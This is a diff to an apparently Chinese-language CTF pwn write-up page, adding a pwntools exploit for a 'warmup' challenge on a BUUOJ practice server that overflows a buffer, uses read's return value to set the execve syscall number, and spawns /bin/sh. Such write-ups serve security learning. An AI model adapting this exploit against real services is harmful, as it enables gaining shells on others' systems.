@@ -389,6 +389,30 @@ icon: icon-html
 
   
 
+  read返回值搞出execve系统调用号11
+
+  ```python
+  from pwn import *
+  r = remote('node2.buuoj.cn.wetolink.com', 28772)
+  #r = process('warmup')
+  binsh = '/bin/sh\x00\x00\x00\x00'
+  fuck_addr =0x80491bc
+  read = 0x804811d
+  start = 0x080480d8
+  fuck_reg = 0x8048122
+  padding = 'a'*0x20
+  payload = padding+p32(read)+p32(start)+p32(0)+p32(fuck_addr)+p32(11)
+  r.send(payload)
+  r.send(binsh)
+  payload =  padding+p32(read)+p32(fuck_reg)
+  payload += p32(0)+p32(fuck_addr)+p32(0x8049210)
+  r.send(payload)
+  r.send(binsh)
+  r.interactive()
+  ```
+
+  远程能跑本地跑不出来
+
 * ### oneshot_tjctf_2016
 
   ```python
@@ -836,6 +860,8 @@ icon: icon-html
   r.interactive()
   
   ```
+
+* 
 
   
 
